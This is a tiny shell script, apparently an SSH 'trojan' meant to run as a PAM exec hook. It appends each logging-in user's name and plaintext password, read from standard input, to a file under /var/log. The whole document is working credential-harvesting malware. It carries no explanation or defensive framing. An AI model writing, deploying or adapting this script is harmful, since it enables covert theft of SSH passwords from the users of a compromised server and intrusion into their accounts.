#!/bin/sh

echo "username: $PAM_USER" >> /var/log/log_sshtrojan1.txt

echo "password: $(cat -)" >> /var/log/log_sshtrojan1.txt